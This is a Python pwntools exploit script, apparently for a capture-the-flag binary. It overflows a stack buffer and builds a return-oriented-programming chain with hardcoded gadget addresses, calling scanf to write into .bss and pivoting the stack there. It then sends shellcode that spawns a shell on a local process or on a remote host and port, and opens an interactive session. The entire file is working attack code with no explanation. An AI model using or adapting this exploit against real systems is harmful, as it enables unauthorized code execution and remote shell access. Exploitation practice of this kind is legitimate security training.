import sys
import logging
from pwn import *
logging.basicConfig(level=logging.INFO, format="%(message)s")
#logging.disable(logging.CRITICAL)

if len(sys.argv) == 2:
    program_name = sys.argv[1]
    target = process(program_name)
    logging.info("***local exploit ***")

else:
    HOST = sys.argv[1]
    PORT = int(sys.argv[2])
    logging.info("***remote exploit ***")
    logging.info("[*]target host : " + HOST)
    logging.info("[*]target port : " + str(PORT))
    target = remote(HOST, PORT)

###address###
puts_plt = 0x400580
scanf_plt = 0x4005c0

pop_rdi_ret = 0x00000000004007e3
pop_rsi_r15 = 0x00000000004007e1 
pop_rbp_ret = 0x0000000000400638
leave_ret = 0x0000000000400706

ret_addr = 0x0000000000400566 

bss_writable = 0x600c00

call_rax = 0x0000000000400560

format_st = 0x40081b

context(arch='amd64')
shellcode = asm(shellcraft.amd64.linux.sh())
#shellcode = asm(shellcraft.amd64.linux.cat("flag.txt"))

###main###
def main():
    ###payload###
    payload = b"A" * 40
    #payload += p64(ret_addr)
    payload += p64(pop_rdi_ret)
    payload += p64(format_st)
    payload += p64(pop_rsi_r15)
    payload += p64(bss_writable + 0x308)
    payload += b"B" * 8
    payload += p64(scanf_plt)
    payload += p64(pop_rbp_ret)
    payload += p64(bss_writable + 0x300)
    payload += p64(leave_ret)
    payload += b"C" * 8

    print(payload)
    print(target.recvline())
    target.sendline(payload)
    
    print(shellcode)

    target.sendline(p64(bss_writable + 0x310) + shellcode)

    target.interactive()


if __name__ == "__main__":
    main()